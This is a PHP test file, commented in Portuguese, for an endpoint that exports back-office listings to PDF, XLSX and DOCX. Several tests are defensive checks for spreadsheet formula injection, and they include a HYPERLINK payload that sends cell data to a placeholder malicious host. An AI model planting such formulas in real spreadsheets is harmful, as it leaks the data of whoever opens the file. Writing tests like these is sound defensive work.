<?php

use App\Models\User;
use App\Relatorios\Exportadores\ExportadorXlsx;
use App\Relatorios\Suporte\ResultadoRelatorio;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;

/*
|--------------------------------------------------------------------------
| Exportação de listagem — o ponto único de PDF / XLSX / DOCX
|--------------------------------------------------------------------------
|
| Toda listagem da Retaguarda exporta pelo MESMO endpoint, e o que sai é o
| RECORTE VISÍVEL: as linhas vêm da tela, já filtradas. O que se testa aqui são
| as leis desse contrato — as que, quando quebradas, entregam ao cliente um
| arquivo errado ou perigoso:
|
|   • conteúdo que parece fórmula NÃO vira fórmula executável na planilha;
|   • campo que a tela não declarou NÃO entra no documento;
|   • o recorte vai IMPRESSO (senão, semanas depois, ninguém sabe o que é);
|   • volume acima do teto é recusado dizendo o que fazer;
|   • os três formatos geram de verdade, e o PDF preserva os glifos.
|
*/

/** @param array<string, mixed> $extra */
function payloadExportacao(array $extra = []): array
{
    return array_merge([
        'formato' => 'pdf',
        'titulo' => 'Usuários do sistema',
        'subtitulo' => 'Sistema › Relatórios',
        'contexto' => 'Somente ativos · busca: "fiscal"',
        'colunas' => [
            ['chave' => 'nome', 'titulo' => 'Nome'],
            ['chave' => 'situacao', 'titulo' => 'Situação', 'alinhar' => 'center'],
        ],
        'linhas' => [
            ['nome' => 'Ana Fiscal', 'situacao' => 'Ativo'],
            ['nome' => 'Bruno Guedes', 'situacao' => 'Inativo'],
        ],
    ], $extra);
}

function textoDoXlsx(string $conteudo): string
{
    return textoDaAba(IOFactory::createReader('Xlsx')->load(arquivoTemporarioXlsx($conteudo))->getActiveSheet());
}

function admGerador(): User
{
    return User::factory()->create(['name' => 'Ana Admin', 'admin' => true]);
}

/**
 * As células gravadas como FÓRMULA em qualquer aba da planilha.
 *
 * ⚠️ Olhar o texto não serve: uma célula de TEXTO que contém "=…" é lida de volta
 * como a mesma string de uma fórmula. O que distingue é o tipo gravado.
 *
 * @return list<string>
 */
function celulasFormula(string $conteudo): array
{
    $planilha = IOFactory::createReader('Xlsx')->load(arquivoTemporarioXlsx($conteudo));
    $formulas = [];

    foreach ($planilha->getAllSheets() as $aba) {
        foreach ($aba->getRowIterator() as $linha) {
            $iterador = $linha->getCellIterator();
            $iterador->setIterateOnlyExistingCells(true);

            foreach ($iterador as $celula) {
                if ($celula->getDataType() === DataType::TYPE_FORMULA) {
                    $formulas[] = $aba->getTitle().'!'.$celula->getCoordinate().' = '.(string) $celula->getValue();
                }
            }
        }
    }

    return $formulas;
}

test('exporta nos tres formatos, com o nome e o tipo certos no download', function () {
    $esperado = ['pdf' => 'application/pdf', 'xlsx' => 'spreadsheetml', 'docx' => 'wordprocessingml'];

    foreach ($esperado as $formato => $tipo) {
        $r = $this->actingAs(admGerador())
            ->post(route('retaguarda.exportar-listagem'), payloadExportacao(['formato' => $formato]));

        $r->assertOk();
        expect((string) $r->headers->get('content-type'))->toContain($tipo);
        expect((string) $r->headers->get('content-disposition'))
            ->toContain('attachment')
            ->toContain(".{$formato}");
    }
});

test('formato desconhecido e recusado', function () {
    $this->actingAs(admGerador())
        ->post(route('retaguarda.exportar-listagem'), payloadExportacao(['formato' => 'exe']))
        ->assertSessionHasErrors('formato');
});

test('exige autenticacao', function () {
    $this->post(route('retaguarda.exportar-listagem'), payloadExportacao())->assertRedirect();
});

test('conteudo que parece formula vai como texto', function () {
    /*
     * ⚠️ SEGURANÇA — injeção de fórmula (XLSX injection). O conteúdo vem do banco: um apelido
     * digitado em rua pode começar com `=`. Sem tratamento, o PhpSpreadsheet grava aquilo como
     * FÓRMULA de verdade e o Excel a executa ao abrir o arquivo, na máquina de quem o recebeu.
     */
    $perigosos = ['=HYPERLINK("http://mal.example/?x="&A1,"clique")', '+1+1', '-2-2', '@SUM(A1)', '=1+1'];

    $r = $this->actingAs(admGerador())->post(route('retaguarda.exportar-listagem'), payloadExportacao([
        'formato' => 'xlsx',
        'linhas' => array_map(fn (string $v) => ['nome' => $v, 'situacao' => 'Ativo'], $perigosos),
    ]));

    $r->assertOk();
    // ⚠️ `streamedContent()` consome o stream — só pode ser lido UMA vez.
    $conteudo = $r->streamedContent();
    $planilha = IOFactory::createReader('Xlsx')->load(arquivoTemporarioXlsx($conteudo));

    // ⚠️ Olhar o TEXTO não serve: célula de texto contendo "=…" é lida de volta como a mesma
    // string de uma fórmula. O que distingue é o TIPO gravado na planilha.
    $formulas = [];
    foreach ($planilha->getActiveSheet()->getRowIterator() as $linha) {
        $iterador = $linha->getCellIterator();
        $iterador->setIterateOnlyExistingCells(true);
        foreach ($iterador as $celula) {
            if ($celula->getDataType() === DataType::TYPE_FORMULA) {
                $formulas[] = (string) $celula->getValue();
            }
        }
    }

    expect($formulas)->toBe([], 'célula gravada como fórmula: '.implode(' | ', $formulas));
    // E o texto original não pode ter sido perdido — só neutralizado.
    expect(textoDoXlsx($conteudo))->toContain('HYPERLINK');
});

test('a moldura do documento tambem nao vira formula', function () {
    /*
     * A promessa não tem ressalva: NENHUMA célula da planilha vira fórmula. E o
     * corpo da tabela não é a única coisa que a tela envia — título, recorte,
     * caminho no menu e o título de cada coluna também vêm do cliente. Escapar só
     * as células de dados deixaria quatro portas abertas na mesma parede.
     */
    $r = $this->actingAs(admGerador())->post(route('retaguarda.exportar-listagem'), payloadExportacao([
        'formato' => 'xlsx',
        'titulo' => '=1+1',                                  // vira o título do documento (A1)
        'subtitulo' => '=HYPERLINK("http://mal.example")',   // vira o título da seção e abre o recorte (A2)
        'contexto' => '=SUM(A1:A9)',                          // entra no recorte impresso
        'colunas' => [
            ['chave' => 'nome', 'titulo' => '=1+1'],          // vira a linha de CABEÇALHO
            ['chave' => 'situacao', 'titulo' => 'Situação'],
        ],
        'linhas' => [['nome' => 'Ana Fiscal', 'situacao' => 'Ativo']],
    ]));

    $r->assertOk();
    $formulas = celulasFormula($r->streamedContent());

    expect($formulas)->toBe([], 'célula gravada como fórmula: '.implode(' | ', $formulas));
});

test('o rotulo de um total tambem nao vira formula', function () {
    /*
     * O quinto ponto de escrita. Este não vem do endpoint de listagem, mas o
     * exportador é compartilhado com os relatórios — e ali o rótulo de um total
     * pode carregar dado de cadastro (o nome de um setor, de uma pessoa). A
     * defesa fica no ponto de ESCRITA, não em quem chama.
     */
    $resultado = new ResultadoRelatorio;
    $resultado->metadados = ['titulo' => 'Teste', 'gerado_em' => '25/08/2026'];

    $secao = $resultado->secao('Seção');
    $secao->coluna('nome', 'Nome');
    $secao->coluna('valor', 'Valor');
    $secao->linha(['nome' => 'Ana', 'valor' => '1']);
    $secao->total('=1+1', '', ['valor' => '=2+2']);

    $resposta = app(ExportadorXlsx::class)->baixar($resultado, 'teste');

    ob_start();
    $resposta->sendContent();
    $conteudo = (string) ob_get_clean();

    $formulas = celulasFormula($conteudo);

    expect($formulas)->toBe([], 'célula gravada como fórmula: '.implode(' | ', $formulas));
});

test('campo nao declarado nao entra no arquivo', function () {
    // A tela costuma passar o objeto inteiro; id e marcas internas não podem vazar para dentro de
    // um documento que sai do sistema.
    $r = $this->actingAs(admGerador())->post(route('retaguarda.exportar-listagem'), payloadExportacao([
        'formato' => 'xlsx',
        'linhas' => [['nome' => 'Ana Fiscal', 'situacao' => 'Ativo', 'oculto' => 'nao-vaza']],
    ]));

    expect(textoDoXlsx($r->streamedContent()))->not->toContain('nao-vaza');
});

test('o recorte vai impresso no arquivo', function () {
    // Sem o recorte escrito, semanas depois ninguém sabe se aquelas linhas eram "todas", "só
    // ativas" ou o resultado de uma busca.
    $r = $this->actingAs(admGerador())
        ->post(route('retaguarda.exportar-listagem'), payloadExportacao(['formato' => 'xlsx']));

    $texto = textoDoXlsx($r->streamedContent());

    expect($texto)
        ->toContain('USUÁRIOS DO SISTEMA')          // título
        ->toContain('Somente ativos')                // filtro aplicado
        ->toContain('2 registros exportados')      // volume, com a concordância feita
        ->not->toContain('registro(s)')              // e não empurrada ao leitor
        ->toContain('Ana Admin');                    // quem emitiu
});

test('valor ausente vira travessao', function () {
    // Célula em branco no meio da tabela parece erro de geração.
    $r = $this->actingAs(admGerador())->post(route('retaguarda.exportar-listagem'), payloadExportacao([
        'formato' => 'xlsx',
        'linhas' => [['nome' => 'Sem situação']], // 'situacao' ausente de propósito
    ]));

    expect(textoDoXlsx($r->streamedContent()))->toContain('—');
});

test('recusa volume acima do teto dizendo o que fazer', function () {
    $r = $this->actingAs(admGerador())->post(
        route('retaguarda.exportar-listagem'),
        payloadExportacao(['linhas' => array_fill(0, 5001, ['nome' => 'x', 'situacao' => 'Ativo'])]),
    );

    $r->assertSessionHasErrors('linhas');
    expect(session('errors')->first('linhas'))->toContain('Refine o filtro');
});

test('o pdf preserva seta, separador de breadcrumb e travessao', function () {
    /*
     * Com `font-family: sans-serif`, o dompdf resolve para a core font Helvetica — limitada à
     * tabela Windows-1252 — e esses glifos saem como "?" no arquivo entregue. A fonte embutida
     * DejaVu Sans é Unicode e cobre todos eles.
     */
    $r = $this->actingAs(admGerador())->post(route('retaguarda.exportar-listagem'), payloadExportacao([
        'formato' => 'pdf',
        'subtitulo' => 'Menu → Sistema → Relatórios',
        'colunas' => [
            ['chave' => 'periodo', 'titulo' => 'Período'],
            ['chave' => 'fluxo', 'titulo' => 'Fluxo'],
        ],
        'linhas' => [
            ['periodo' => '10/02/2026 → 15/02/2026', 'fluxo' => 'campo → validação do chefe de setor'],
            ['periodo' => '—', 'fluxo' => 'regular → em dia'],
        ],
    ]));

    $r->assertOk();
    $pdf = (string) $r->getContent();

    // A fonte Unicode tem de estar EMBUTIDA (a core font não é embutida no arquivo).
    expect($pdf)->toContain('DejaVuSans');

    // E os glifos têm de sobreviver: com a fonte embutida o texto vai em UTF-16BE nos streams
    // (→ = 21 92 · › = 20 3A · — = 20 14).
    $textos = '';
    if (preg_match_all("/stream\r?\n(.*?)endstream/s", $pdf, $m)) {
        foreach ($m[1] as $bruto) {
            $inflado = @gzuncompress($bruto);
            if ($inflado === false) {
                $inflado = @gzinflate(substr($bruto, 2));
            }
            $textos .= $inflado !== false ? $inflado : $bruto;
        }
    }

    expect($textos)
        ->toContain(hex2bin('2192'))  // →
        ->toContain(hex2bin('203a'))  // ›
        ->toContain(hex2bin('2014')); // —
});
